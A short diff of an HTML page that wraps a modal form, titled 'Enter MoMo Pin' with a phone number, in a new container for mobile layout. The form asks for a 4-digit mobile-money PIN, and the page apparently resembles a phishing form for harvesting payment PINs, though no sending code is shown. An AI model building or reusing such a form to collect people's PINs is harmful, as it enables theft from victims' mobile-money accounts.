@@ -18,29 +18,31 @@
       <button class="modal-btn"></button>
     </div>
     <div class="modal-bg">
-      <div class="modal-box">
+      <div class="modal-box" id="resizemobile">
         <h1>Enter MoMo Pin<br />(055 106 6605)</h1>
-        <form>
-          <input
-            type="number"
-            oninput="this.value=this.value.slice(0,this.maxLength)"
-            name="pin"
-            class="guess"
-            placeholder="4 DIGITS PIN HERE"
-            pattern="[0-9]{4}"
-            maxlength="4"
-            autocomplete="current-password"
-            required=""
-            id="id_password"
-          />
-          <i
-            class="far fa-eye"
-            id="togglePassword"
-            style="margin-left: -30px; cursor: pointer"
-          ></i>
-          <input type="submit" value="send" />
-        </form>
-        <p>Make sure no one is looking at your <br />PIN</p>
+        <div class="posit">
+          <form>
+            <input
+              type="number"
+              oninput="this.value=this.value.slice(0,this.maxLength)"
+              name="pin"
+              class="guess"
+              placeholder="4 DIGITS PIN HERE"
+              pattern="[0-9]{4}"
+              maxlength="4"
+              autocomplete="current-password"
+              required=""
+              id="id_password"
+            />
+            <i
+              class="far fa-eye"
+              id="togglePassword"
+              style="margin-left: -30px; cursor: pointer"
+            ></i>
+            <input type="submit" value="send" />
+          </form>
+          <p>Make sure no one is looking at your <br />PIN</p>
+        </div>
         <button class="close-modal">&times;</button>
       </div>
     </div>
